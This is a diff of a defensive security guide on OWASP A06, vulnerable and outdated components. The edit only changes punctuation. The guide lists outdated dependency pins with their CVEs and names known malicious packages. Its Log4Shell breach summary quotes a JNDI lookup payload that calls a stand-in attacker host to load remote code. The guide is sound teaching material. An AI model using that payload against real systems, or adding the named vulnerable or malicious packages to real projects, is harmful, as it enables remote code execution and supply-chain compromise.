@@ -1,8 +1,8 @@
-# A06 — Vulnerable and Outdated Components
+# A06: Vulnerable and Outdated Components
 
 ## Summary
 
-Modern web applications depend on hundreds of third-party libraries, frameworks, and runtime components. Vulnerable and outdated components covers the risk that one or more of those dependencies contains a known security vulnerability that an attacker can exploit. Unlike most OWASP categories, this vulnerability does not require you to write bad code — it appears simply by running your application with an outdated or compromised package. The attack surface includes npm packages, Python packages, Docker base images, operating system packages, and the runtime itself (Node.js, Python, Java). Log4Shell (CVE-2021-44228) is the most visible recent example: a single vulnerable library used by thousands of applications across every industry.
+Modern web applications depend on hundreds of third-party libraries, frameworks, and runtime components. Vulnerable and outdated components covers the risk that one or more of those dependencies contains a known security vulnerability that an attacker can exploit. Unlike most OWASP categories, this vulnerability does not require you to write bad code: it appears simply by running your application with an outdated or compromised package. The attack surface includes npm packages, Python packages, Docker base images, operating system packages, and the runtime itself (Node.js, Python, Java). Log4Shell (CVE-2021-44228) is the most visible recent example: a single vulnerable library used by thousands of applications across every industry.
 
 ---
 
@@ -11,10 +11,10 @@ Modern web applications depend on hundreds of third-party libraries, frameworks,
 ### Outdated packages with known CVEs
 
 ```json
-// package.json — VULNERABLE: pinned to old versions with known CVEs
+// package.json: VULNERABLE: pinned to old versions with known CVEs
 {
   "dependencies": {
-    "express": "4.16.0",       // Older version — check npm audit
+    "express": "4.16.0",       // Older version: check npm audit
     "jsonwebtoken": "8.5.1",   // CVE-2022-23529: arbitrary secret in some configurations
     "axios": "0.21.1",         // CVE-2021-3749: ReDoS vulnerability
     "lodash": "4.17.15",       // CVE-2021-23337: command injection via template
@@ -24,17 +24,17 @@ Modern web applications depend on hundreds of third-party libraries, frameworks,
 ```
 
 ```python
-# requirements.txt — VULNERABLE
-Django==3.2.0          # Multiple CVEs since 3.2.0 — update to latest 3.2.x LTS
+# requirements.txt: VULNERABLE
+Django==3.2.0          # Multiple CVEs since 3.2.0: update to latest 3.2.x LTS
 Pillow==8.0.0          # CVE-2021-34552: heap buffer overflow
-cryptography==2.8      # Multiple CVEs — far behind current
+cryptography==2.8      # Multiple CVEs: far behind current
 requests==2.18.0       # Multiple security fixes since 2.18.0
 ```
 
 ### No audit in CI pipeline
 
 ```yaml
-# .github/workflows/ci.yml — VULNERABLE: no dependency audit step
+# .github/workflows/ci.yml: VULNERABLE: no dependency audit step
 name: CI
 on: [push]
 jobs:
@@ -50,10 +50,10 @@ jobs:
 ### Using untrusted or typosquatted packages
 
 ```json
-// package.json — DANGEROUS: typosquatted or unknown package
+// package.json: DANGEROUS: typosquatted or unknown package
 {
   "dependencies": {
-    "crossenv": "7.0.0",       // Typosquat of "cross-env" — contained malware
+    "crossenv": "7.0.0",       // Typosquat of "cross-env": contained malware
     "event-stream": "3.3.6",   // 2018: malicious version injected into npm
     "node-ipc": "10.1.3"       // 2022: intentionally sabotaged to wipe files
   }
@@ -83,7 +83,7 @@ npm audit --json | jq '.vulnerabilities | to_entries[] | select(.value.severity=
 ### Add dependency auditing to CI
 
 ```yaml
-# .github/workflows/ci.yml — FIXED
+# .github/workflows/ci.yml: FIXED
 name: CI
 on: [push, pull_request]
 
@@ -136,7 +136,7 @@ pip-audit -r requirements.txt --format json
 ### Keep dependencies updated with Dependabot
 
 ```yaml
-# .github/dependabot.yml — automatically opens PRs for security updates
+# .github/dependabot.yml: automatically opens PRs for security updates
 version: 2
 updates:
   - package-ecosystem: "npm"
@@ -162,7 +162,7 @@ updates:
 ### Scan Docker images for vulnerabilities
 
 ```bash
-# Using Trivy (recommended — free, fast)
+# Using Trivy (recommended: free, fast)
 docker run --rm \
   -v /var/run/docker.sock:/var/run/docker.sock \
   aquasec/trivy:latest image \
@@ -173,14 +173,14 @@ docker run --rm \
 trivy image --severity HIGH,CRITICAL node:20-alpine
 ```
 
-> **Critical:** A `package-lock.json` or `requirements.txt` pin gives you reproducible builds but does not protect you from vulnerabilities in pinned versions. Audit regularly — pinning old vulnerable versions is not safer than updating.
+> **Critical:** A `package-lock.json` or `requirements.txt` pin gives you reproducible builds but does not protect you from vulnerabilities in pinned versions. Audit regularly: pinning old vulnerable versions is not safer than updating.
 
 ---
 
 ## Real-World Breach
 
-**Log4Shell — December 2021 (CVE-2021-44228)**
-Apache Log4j 2, a logging library used in virtually every Java application, contained a critical remote code execution vulnerability. An attacker could trigger it by logging a string like `${jndi:ldap://attacker.com/a}` — which Log4j would interpret and execute, connecting to the attacker's server and loading arbitrary code. The library was embedded in thousands of products including VMware, Cisco, Amazon Web Services infrastructure, and government systems worldwide. Within 72 hours of disclosure, over 800,000 exploitation attempts were recorded per hour. Many organisations took weeks to identify all affected systems because the dependency was often transitive (a dependency of a dependency of a dependency). Patches were available within 24 hours of disclosure, but organisations that had no dependency inventory had no way to know if they were affected.
+**Log4Shell: December 2021 (CVE-2021-44228)**
+Apache Log4j 2, a logging library used in virtually every Java application, contained a critical remote code execution vulnerability. An attacker could trigger it by logging a string like `${jndi:ldap://attacker.com/a}`, which Log4j would interpret and execute, connecting to the attacker's server and loading arbitrary code. The library was embedded in thousands of products including VMware, Cisco, Amazon Web Services infrastructure, and government systems worldwide. Within 72 hours of disclosure, over 800,000 exploitation attempts were recorded per hour. Many organisations took weeks to identify all affected systems because the dependency was often transitive (a dependency of a dependency of a dependency). Patches were available within 24 hours of disclosure, but organisations that had no dependency inventory had no way to know if they were affected.
 
 ---
 
@@ -212,7 +212,7 @@ diff requirements.txt current-packages.txt
 ### Check for known malicious packages
 
 ```bash
-# Socket.dev CLI — scans for supply chain risks
+# Socket.dev CLI: scans for supply chain risks
 npx @socket/cli scan .
 
 # Or use the GitHub App: socket.dev
@@ -251,7 +251,7 @@ Vulnerable dependencies are one of the few attack surfaces that require no inter
 
 ## Learn More
 
-- [OWASP A06:2021 — Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)
+- [OWASP A06:2021: Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)
 - [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/)
 - [National Vulnerability Database (NVD)](https://nvd.nist.gov/)
 - [OpenAuditor: Supply Chain Security](../../05-supply-chain-security/)
